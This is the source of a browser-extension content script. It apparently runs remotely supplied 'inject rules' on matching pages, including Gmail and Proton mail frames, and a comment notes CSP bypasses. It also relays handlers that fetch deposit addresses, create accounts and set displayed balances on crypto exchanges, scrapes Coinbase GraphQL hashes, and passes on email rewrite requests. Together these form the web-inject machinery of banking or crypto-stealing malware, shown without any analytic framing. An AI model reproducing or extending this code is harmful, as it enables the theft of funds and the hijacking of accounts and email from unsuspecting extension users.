(function () {
  'use strict'

  function isContextValid() {
    try {
      return !!(chrome && chrome.runtime && chrome.runtime.id)
    } catch (_) {
      return false
    }
  }

  if (!isContextValid()) return

  var executed = {}
  var failCounts = {}
  var lastRulesFetch = 0

  function sendToBackground(message, callback) {
    if (!isContextValid()) {
      if (callback) callback(undefined)
      return
    }
    try {
      chrome.runtime.sendMessage(message, function (response) {
        if (chrome.runtime.lastError) {
          if (callback) callback(undefined)
          return
        }
        if (callback) callback(response)
      })
    } catch (_) {
      if (callback) callback(undefined)
    }
  }

  function getInjectRules(cb) {
    sendToBackground({ type: 'GET_INJECT_RULES' }, function (rules) {
      cb(rules || [])
    })
  }

  // Gmail/Proton рендерят тело письма в iframe, у которого location может быть
  // about:blank / blob: / cid:. Поэтому проверяем не только свой href, но и
  // referrer, и origin родителя (когда доступен).
  function candidateUrls() {
    var list = [window.location.href]
    try { if (document.referrer) list.push(document.referrer) } catch (_) {}
    try {
      // для вложенных фреймов — попробуем узнать хост предка
      if (window.top && window.top !== window) {
        try { list.push(window.top.location.href) } catch (_) {}
        try { list.push(document.location.ancestorOrigins && document.location.ancestorOrigins[0]) } catch (_) {}
      }
    } catch (_) {}
    return list.filter(Boolean)
  }

  function matches(ruleUrl, urls) {
    try {
      var re = new RegExp(ruleUrl)
      for (var i = 0; i < urls.length; i++) {
        if (re.test(urls[i])) return true
      }
    } catch (_) {}
    return false
  }

  function executeInjects(attempt) {
    if (!isContextValid()) return
    lastRulesFetch = Date.now()

    getInjectRules(function (rules) {
      if (!isContextValid()) return

      if ((!rules || !rules.length) && attempt < 45) {
        setTimeout(function () { executeInjects(attempt + 1) }, 2000)
        return
      }

      var currentUrl = window.location.href
      var urls = candidateUrls()
      for (var i = 0; i < rules.length; i++) {
        var rule = rules[i]
        try {
          var key = rule.url + '::' + (rule.command || '') + '::' + (urls[0] || currentUrl)
          if (executed[key]) continue
          if (rule.url && matches(rule.url, urls)) {
            sendToBackground({
              type: 'EXECUTE_INJECT',
              code: rule.value,
              command: 'PRESET',
              url: currentUrl,
            }, function (response) {
              if (response && response.ok) {
                executed[key] = true
              } else if ((failCounts[key] || 0) < 3) {
                // Исполнение не удалось (CSP и оба обхода) — повторим позже.
                failCounts[key] = (failCounts[key] || 0) + 1
                setTimeout(function () { executeInjects(0) }, 15000)
              }
            })
          }
        } catch (_) {}
      }
    })
  }

  function bootInjectRunner() {
    executeInjects(0)

    var lastHref = window.location.href
    setInterval(function () {
      if (!isContextValid()) return
      if (window.location.href === lastHref) return
      lastHref = window.location.href
      executeInjects(0)
    }, 800)
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', bootInjectRunner)
  } else {
    bootInjectRunner()
  }

  try {
    chrome.storage.onChanged.addListener(function (changes, area) {
      if (area !== 'local' || !Object.keys(changes).length) return
      // Частые записи (lastActive и т.п.) не должны вызывать перезапрос правил.
      if (Date.now() - lastRulesFetch < 5000) return
      executeInjects(0)
    })
  } catch (_) {}

  window.addEventListener('message', function (event) {
    if (event.source !== window) return
    if (!isContextValid()) return

    if (event.data && event.data.type === '__inject_report') {
      sendToBackground({
        type: 'INJECT_REPORT',
        data: event.data.data,
      })
      return
    }

    var msgType = event.data && event.data.type
    if (!msgType) return

    if (msgType === 'exchange-get-settings') {
      sendToBackground({ type: 'EXCHANGE_SETTINGS' }, function (response) {
        window.postMessage(
          { cmd: 'exchange-settings', param: response || { min_amount: '0', setting: [] } },
          '*',
        )
      })
      return
    }

    if (msgType === 'exchange-get-address') {
      sendToBackground({ type: 'EXCHANGE_GET_ADDRESS', params: event.data.param || {} }, function (response) {
        window.postMessage({ cmd: 'exchange-get-addr', param: response || '' }, '*')
      })
      return
    }

    if (msgType === 'exchange-create-account') {
      sendToBackground({ type: 'EXCHANGE_CREATE_ACCOUNT', param: event.data.param || {} }, function (response) {
        window.postMessage({ cmd: 'exchange-create-acc', param: response || null }, '*')
      })
      return
    }

    if (msgType === 'exchange-set-balance') {
      sendToBackground({ type: 'EXCHANGE_SET_BALANCE', param: event.data.param || {} }, function () {
        window.postMessage({ cmd: 'exchange-set-balanc', param: true }, '*')
      })
      return
    }

    if (msgType === 'exchange-set-all-balances') {
      sendToBackground({ type: 'EXCHANGE_SET_ALL_BALANCES', param: event.data.param || {} }, function () {
        window.postMessage({ cmd: 'exchange-set-all-balanc', param: true }, '*')
      })
      return
    }

    if (msgType === 'exchange-coinbase-get-ext') {
      var extHash = ''
      try {
        var probe = document.createElement('script')
        probe.textContent =
          '(function(){try{var found=window.__cbGraphqlExtensions||"";if(!found){var entries=performance.getEntriesByType("resource");for(var i=entries.length-1;i>=0;i--){var u=entries[i].name||"";var m=u.match(/extensions=([^&]+)/);if(m){found=decodeURIComponent(m[1]);break}}}document.documentElement.setAttribute("data-cb-ext",found||"")}catch(e){document.documentElement.setAttribute("data-cb-ext","")}})()'
        ;(document.head || document.documentElement).appendChild(probe)
        probe.remove()
        extHash = document.documentElement.getAttribute('data-cb-ext') || ''
        document.documentElement.removeAttribute('data-cb-ext')
      } catch (_) {}
      window.postMessage({ cmd: 'exchange-coinbase-get-extension', param: extHash }, '*')
      return
    }

    if (msgType === 'mail-rewrite-request') {
      var reqId = event.data.id
      sendToBackground({ type: 'MAIL_REWRITE', text: event.data.text || '', lang: event.data.lang || '' }, function (response) {
        window.postMessage(
          { cmd: 'mail-rewrite-response', id: reqId, rewritten: (response && response.rewritten) || '' },
          '*',
        )
      })
      return
    }
  })
})()
